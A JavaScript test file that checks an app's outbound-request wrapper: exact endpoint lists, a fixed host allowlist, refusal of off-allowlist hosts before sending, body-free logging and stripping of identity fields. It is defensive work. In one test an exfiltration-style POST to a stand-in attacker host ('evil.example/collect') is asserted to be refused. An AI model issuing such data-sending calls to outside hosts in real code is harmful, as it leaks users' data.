// RUN-CU / CU4 — the main-process outbound boundary. (1) SERVICE_OUTBOUND_PATHS equals EXACTLY the declared list
// (growing it requires editing this test — the CLAUDE.md invariant); (2) the 6-host allowlist is unchanged;
// (3) src/main/outbound.mjs refuses off-allowlist hosts before any byte leaves and records every call into the
// privacy ring without storing a body; (4) every literal https://iisupp.net path in src/main is declared in a class;
// (5) main.mjs has no raw `fetch(` left — everything goes through the wrapper.
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { SERVICE_OUTBOUND_PATHS, isServicePathAllowed, isDeclaredPath, CAPTURE_HOST_ALLOWLIST, classifyRequest, summarizeCapture, UPDATE_OUTBOUND_PATHS, BRAIN_OUTBOUND_PATHS, LICENSE_OUTBOUND_PATHS } from "../src/shared/network-capture.mjs";
import { ALLOWED_OUTBOUND_PATHS } from "../src/shared/recipes.mjs";
import { createOutbound, isOutboundAllowed, stripIdentityFields, RING_MAX } from "../src/main/outbound.mjs";

let n = 0; const t = () => { n++; };

// 1 — the service class is exactly this list, in this order. Adding an endpoint = a deliberate edit here.
assert.deepEqual([...SERVICE_OUTBOUND_PATHS], [
  "/.netlify/functions/aria-sentinel-heartbeat",
  "/.netlify/functions/sentinel-session-report",
  "/.netlify/functions/sentinel-resolve",
  "/.netlify/functions/sentinel-crash",
  "/aria-binary-update",
  "/.netlify/functions/aria-kb-stats",
  "/.netlify/functions/aria-system-status",
  "/.netlify/functions/aria-sentinel-notify",
  "/.netlify/functions/aria-sentinel-approval"
], "SERVICE_OUTBOUND_PATHS is the exact declared list");
assert.ok(Object.isFrozen(SERVICE_OUTBOUND_PATHS), "frozen");
assert.equal(isServicePathAllowed("/.netlify/functions/aria-sentinel-notify"), true);
assert.equal(isServicePathAllowed("/.netlify/functions/aria-sentinel-notify/"), false, "exact match only");
assert.equal(isServicePathAllowed("/.netlify/functions/anything-else"), false);
assert.equal(isDeclaredPath("/.netlify/functions/aria-sentinel-approval"), true);
assert.equal(isDeclaredPath("/.netlify/functions/aria-chat"), true, "brain class still declared");
assert.equal(isDeclaredPath("/.netlify/functions/aria-sentinel-update-manifest"), true, "update class still declared");
assert.equal(isDeclaredPath("/.netlify/functions/sentinel-licenses"), true, "license class still declared");
assert.equal(isDeclaredPath("/.netlify/functions/rogue"), false);
t();

// 2 — the 6-host telemetry allowlist did not grow.
assert.deepEqual([...CAPTURE_HOST_ALLOWLIST], ["iisupp.net", "download.iisupp.net", "127.0.0.1", "localhost", "::1", "*.service-now.com"]);
assert.equal(UPDATE_OUTBOUND_PATHS.length, 2); assert.equal(BRAIN_OUTBOUND_PATHS.length, 5); assert.equal(LICENSE_OUTBOUND_PATHS.length, 1);
t();

// 3 — outbound wrapper: allowed hosts pass; off-allowlist hosts are refused BEFORE fetch; ring records host/path/bytes/verdict, never a body.
{
  const calls = [];
  const ob = createOutbound({ fetchImpl: async (url, init) => { calls.push(url); return { ok: true, status: 200 }; }, now: () => 1000 });
  await ob.fetch("https://iisupp.net/.netlify/functions/aria-sentinel-heartbeat", { method: "POST", body: JSON.stringify({ version: "0.2.0", platform: "win32" }) });
  assert.equal(calls.length, 1);
  await assert.rejects(() => ob.fetch("https://evil.example/collect", { method: "POST", body: "x" }), /outbound-host-not-allowed/);
  await assert.rejects(() => ob.fetch("http://iisupp.net/plain", {}), /outbound-host-not-allowed/, "plain http to a remote host is refused");
  assert.equal(calls.length, 1, "the refused calls never reached fetch");
  const rows = ob.records();
  assert.equal(rows.length, 3, "every attempt is recorded, refused ones included");
  assert.equal(rows[0].host, "iisupp.net"); assert.equal(rows[0].path, "/.netlify/functions/aria-sentinel-heartbeat"); assert.equal(rows[0].method, "POST");
  assert.ok(rows[0].bytes > 10); assert.equal(rows[0].bodySafe, true); assert.equal(rows[0].allowed, true); assert.equal(rows[0].declared, true); assert.equal(rows[0].status, 200);
  assert.equal(rows[1].allowed, false); assert.equal(rows[1].error, "host-not-allowed");
  assert.ok(rows.every((r) => !("body" in r)), "no body is ever stored in the ring");
  assert.equal(ob.since(1000).length, 3); assert.equal(ob.since(2000).length, 0);
  // a leaky body is recorded as bodySafe:false (verdict computed at send time, body discarded)
  await ob.fetch("https://iisupp.net/.netlify/functions/sentinel-crash", { method: "POST", body: JSON.stringify({ note: "C:\\Users\\jdoe\\secret.docx" }) });
  assert.equal(ob.records().at(-1).bodySafe, false);
  // configured identity fields (license email / notify recipients) are counted, not mislabelled as content
  const stripped = stripIdentityFields({ key: "k", email: "a@b.com", user: { email: "c@d.com" }, recipients: [{ email: "e@f.com", phone: "+1 416 555 0100" }], title: "Spooler" });
  assert.equal(stripped.count, 4); assert.ok(!JSON.stringify(stripped.value).includes("@"));
  await ob.fetch("https://iisupp.net/.netlify/functions/sentinel-resolve", { method: "POST", body: JSON.stringify({ key: "k", email: "a@b.com" }) });
  assert.equal(ob.records().at(-1).bodySafe, true); assert.equal(ob.records().at(-1).identityFields, 1);
  // ring is bounded
  const small = createOutbound({ fetchImpl: async () => ({ ok: true, status: 200 }), ringMax: 3 });
  for (let i = 0; i < 6; i++) await small.fetch("https://iisupp.net/.netlify/functions/aria-kb-stats");
  assert.equal(small.records().length, 3); assert.ok(RING_MAX >= 3);
  // webhook + graph hosts are allowed by design (declared classes); anything else is not
  assert.equal(isOutboundAllowed("https://hooks.slack.com/services/x").ok, true);
  assert.equal(isOutboundAllowed("https://graph.microsoft.com/v1.0/me").ok, true);
  assert.equal(isOutboundAllowed("https://acme.service-now.com/api").ok, true);
  assert.equal(isOutboundAllowed("https://api.openai.com/v1").ok, false);
  assert.equal(isOutboundAllowed("not a url").reason, "bad-url");
}
t();

// 4 — the privacy verifier honours a pre-measured main-process row (bytes + verdict) instead of reading an absent body.
{
  const row = classifyRequest({ url: "https://iisupp.net/.netlify/functions/aria-sentinel-notify", method: "POST", payloadBytes: 812, sanitizationStatus: "clean", source: "main-process", identityFields: 2 });
  assert.equal(row.payloadBytes, 812); assert.equal(row.sanitizationStatus, "clean"); assert.equal(row.declared, true); assert.equal(row.source, "main-process"); assert.equal(row.identityFields, 2);
  const leak = classifyRequest({ url: "https://iisupp.net/.netlify/functions/sentinel-crash", method: "POST", payloadBytes: 50, sanitizationStatus: "leak" });
  assert.equal(leak.sanitizationStatus, "leak");
  const s = summarizeCapture([
    { url: "https://iisupp.net/.netlify/functions/aria-sentinel-notify", method: "POST", payloadBytes: 812, sanitizationStatus: "clean", source: "main-process" },
    { url: "https://iisupp.net/.netlify/functions/sentinel-crash", method: "POST", payloadBytes: 50, sanitizationStatus: "leak", source: "main-process" }
  ]);
  assert.equal(s.leakingPayloadCount, 1); assert.equal(s.disallowedHostCount, 0); assert.equal(s.pass, false, "a leaking main-process body fails the verdict like any other");
  const legacy = classifyRequest({ url: "https://iisupp.net/.netlify/functions/aria-recipe-feedback", method: "POST", body: JSON.stringify({ recipe_id: "dns-fail-v1" }) });
  assert.equal(legacy.sanitizationStatus, "clean", "renderer rows with a real body are classified exactly as before");
  assert.equal(classifyRequest({ url: "https://iisupp.net/x", method: "GET" }).payloadBytes, 0);
}
t();

// 5 — every literal https://iisupp.net path in src/main (and the brain client) is in a declared class; main has no raw fetch( left.
{
  const root = path.resolve(import.meta.dirname, "..");
  const files = ["src/main/main.mjs", "src/main/notify-dispatch.mjs", "src/main/crash-reporter.mjs", "src/shared/aria-brain-client.mjs", "src/shared/auto-update.mjs", "src/shared/recipes.mjs"];
  const undeclared = [];
  for (const f of files) {
    const src = fs.readFileSync(path.join(root, f), "utf8");
    for (const m of src.matchAll(/https:\/\/iisupp\.net(\/[^\s"'`)?]*)/g)) {
      const p = m[1];
      if (p === "/" || p === "" || p === "/aria-sentinel" || p.startsWith("/aria-sentinel/") || p === "/account" || p === "/contact" || p === "/aria" || p === "/downloads" || p === "/sentinel-status" || p === "/plans" || p.startsWith("/plans/")) continue; // user-facing pages opened in the browser, not fetched (PROD 2026-10-14: /plans is the live plan page)
      if (!isDeclaredPath(p) && !ALLOWED_OUTBOUND_PATHS.some((a) => a.path === p)) undeclared.push(`${f}: ${p}`);
    }
  }
  assert.deepEqual(undeclared, [], `undeclared iisupp.net paths:\n${undeclared.join("\n")}`);
  const main = fs.readFileSync(path.join(root, "src/main/main.mjs"), "utf8");
  assert.equal((main.match(/\bawait fetch\(/g) || []).length, 0, "main.mjs has no raw fetch( — every call goes through outbound.fetch");
  assert.ok((main.match(/outbound\.fetch\(/g) || []).length >= 8, "the known main-process calls are routed through the wrapper");
  assert.match(main, /fetchImpl: outbound\.fetch/, "askAria (brain) uses the wrapper too");
  assert.match(main, /outbound\.since\(startedAt\)/, "runPrivacyCapture merges the main-process ring");
}
t();

assert.equal(n, 5, "5 outbound-declared groups");
console.log(`outbound-declared test passed (${n} groups · SERVICE_OUTBOUND_PATHS exact · 6-host allowlist unchanged · wrapper refuses off-allowlist + records without bodies · verifier honours measured rows · every iisupp.net path declared · no raw fetch in main).`);
